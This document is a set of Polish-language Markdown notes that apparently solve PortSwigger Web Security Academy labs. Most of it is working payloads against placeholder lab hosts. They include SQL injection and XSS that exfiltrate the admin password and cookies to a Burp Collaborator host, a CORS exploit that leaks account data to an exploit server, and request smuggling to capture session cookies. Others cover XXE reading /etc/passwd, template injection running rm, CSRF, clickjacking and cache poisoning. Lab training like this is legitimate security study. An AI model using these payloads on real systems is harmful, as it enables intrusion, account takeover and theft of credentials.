## SQL injection
### Blind SQL injection with out-of-band data exfiltration
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
1. Logujemy się jako administrator zdobytym hasłem.

### SQL injection with filter bypass via XML encoding
1. StoreId podmieniamy na:
```xml
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
```
Hackvertor
```sql
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```
2. Logujemy się jako administrator

## Cross-site scripting
### Exploiting cross-site scripting to steal cookies
1. Exploit server:
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Podnieniamy cookie na zdobyte i wchodzimy na '/my-account`

## Cross-site request forgery (CSRF)
### CSRF where token validation depends on token being present
1. Wklejamy do exploi servera: 
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Clickjacking
### Exploiting clickjacking vulnerability to trigger DOM-based XSS
Exploit server:
```html
<style>
	iframe {
		position:relative;
		width: 700;
		height: 500;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top: 610;
		left: 80;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## DOM-based vulnerabilities
### DOM XSS using web messages
Exploit server:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

## Cross-origin resource sharing (CORS)
### CORS vulnerability with trusted insecure protocols
Exploit server:
```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

## XML external entity (XXE) injection
### Exploiting XInclude to retrieve files
1. Podmnienamy productId na:
```html
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Server-side request forgery (SSRF)
### SSRF with blacklist-based input filter
1. Podmieniamy stockApi na:
```
http://127.1/%2561dmin
```
 
## HTTP request smuggling
### Exploiting HTTP request smuggling to capture other users' requests
1. Tworzymy request, cookie będzie w komentarzu
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

## OS command injection
### Blind OS command injection with time delays
1. W submit feedback podmieniamy email na:
```
email=x||ping+-c+10+127.0.0.1||
```

## Server-side template injection
### Basic server-side template injection
1. Wpisujemy link:
```url
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

## Directory traversal
Zmieniamy filename w pobieraniu zdjęcia na:
```
/etc/passwd
```

## Access control vulnerabilities
### URL-based access control can be circumvented
Dodajemy do URLa: 
```
?username=carlos
```
Dodajemy header:
```
X-Original-URL: /admin/delete
```


## Authentication
### Brute-forcing a stay-logged-in cookie

## WebSockets
### Manipulating the WebSocket handshake to exploit vulnerabilities
1. Wiadomość o treści:
```html
<img src=1 oNeRrOr=alert`1`>
```

## Web cache poisoning
### Web cache poisoning with an unkeyed cookie
1. Podmienić cookie na poniższą wartość, aż request się zcachuje
```
fehost=someString"-alert(1)-"someString
```
## Insecure deserialization
### 
1. Podmieniamy obiekt na:
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
2. zmieniamy ścieżkę na 
```
/admin/delete?username=carlos
```
## Information disclosure
### Information disclosure in version control history
1. Pobieramy `.git`
```bash
wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
```
2. Lokalnie znajdujemy hasło do admina

## Business logic vulnerabilities
### Weak isolation on dual-use endpoint
1. Podczas zmiany hasła usuwamy parametr `current-password` i podniemiany `username` na administrator.

## HTTP Host header attacks
### Web cache poisoning via ambiguous requests
1. W exploit serverze tworzymy sciezke pod adresem `/resources/js/tracking.js`
```js
alert(document.cookie)
```
2. Do zapytania dodajemy dodatkowy HOSt header
```
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

## OAuth authentication
### Forced OAuth profile linking
1. Podczas logowania znajdujemy link łączący konta i podmieniamy go w kodzie poniżej i przeklejamy do exploit servera (dropujemy request, żeby nie został użyty)
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```
2. Sprawdzamy czy konta są połączone

## File upload vulnerabilities
### 
1. Uploadujemy ployglot.php
2. Wchodzimy na stronę `/files/avatars/polyglot.php` i mamy sekres carlosa

## JWT
### JWT authentication bypass via weak signing key

## Essential skills
### Discovering vulnerabilities quickly with targeted scanning
Podnieniamy productId na:
```html
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Prototype pollution
### DOM XSS via client-side prototype pollution

Używamy DOM Invader
